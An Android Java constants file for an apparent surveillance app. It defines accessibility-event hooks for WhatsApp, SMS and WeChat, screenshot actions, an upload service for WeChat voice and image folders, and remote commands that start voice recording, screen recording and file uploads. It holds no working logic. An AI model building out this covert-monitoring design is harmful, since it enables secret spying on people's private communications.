package test.com.accessibility.base.IntentInterface;

public class intentInterface {

    public static final String ACTION_Tecent_Screenshot = "test.com.accessibility.action.Tecent_Screenshot";
    public static final String ACTION_Screenshot_dst_dir = "test.com.accessibility.extra.dst_dir";
    public static final String ACTION_Screenshot_mtype = "test.com.accessibility.extra.mtype";
    public static final String ACTION_Screenshot_curApp = "test.com.accessibility.extra.curApp";
    public static final String ACTION_Screenshot_status = "test.com.accessibility.extra.status";
    public static final String Action_WhatApp_Accessibility = "x.y.z.WSapp";
    public static final String Action_SMSApp_Accessibility = "x.y.z.SMSapp";
    public static final String Param_Accessibility_Root = "x.y.z.paccroot";

    public static final String intentServicePkgName = "test.com.accessibility";
    public static final String ServiceName = "test.com.accessibility.base.main.UtilService";
    public static final String intentServiceName = "test.com.accessibility.base.main.UtilIntentService";

    public static final String intentService_Param_RootDir = "intentService_Param_RootDir";

    public static final String Action_Accessibility = "accessbility.event";
    public static final String AccessEvent_Obj = "accessbility.eventobj";
    public static final String AccessEvent_intentToken = "accessbility.token";
    public static final String AccessEvent_PkgName = "access.event.pkgname";
    public static final String AccessEvent_Type = "access.event.type";
    public static final String AccessEvent_Time = "access.event.time";
    public static final String AccessEvent_Action = "access.event.action";
    public static final String AccessEvent_ContentChangeType = "access.event.contentChangeType";
    public static final String AccessEvent_RootNode = "access.event.rootnode";


    public static final String WeChat_Pkg_Name = "com.tencent.mm";

    public static final String UploadService_Action_PkgName = "test.com.accessibility";
    public static final String UploadService_Action_ClsName = "test.com.accessibility.base.main.UploadIntentService";
    public static final String UploadService_Action_DataDir = "upload.service.DataDir";
    public static final String UploadService_Action_DataDir_Param_RootDir = "upload.service.DataDir.rootdir";
    public static final String UploadService_Action_WechatVoiceDir = "upload.service.WechatVoiceDir";
    public static final String UploadService_Action_WechatImageDir = "upload.service.WechatImageDir";

    // Remote Command
    public static final String Remote_CMD_EVENT = "cmd.remote.event";
    public static final String Remote_CMD_EVENT_ACTION_ParamName = "cmd.remote.event.action";
    public static final String Remote_CMD_START_RECORDING = "cmd.voice.recording.start";
    public static final String Remote_CMD_STOP_RECORDING = "cmd.voice.recording.stop";
    public static final String Remote_CMD_UPLOAD_FILES = "cmd.uploading.start";
    public static final String Remote_CMD_START_ScreenRECORDING = "cmd.screen.recording.start";
    public static final String Remote_CMD_STOP_ScreenRECORDING = "cmd.screen.recording.stop";
}
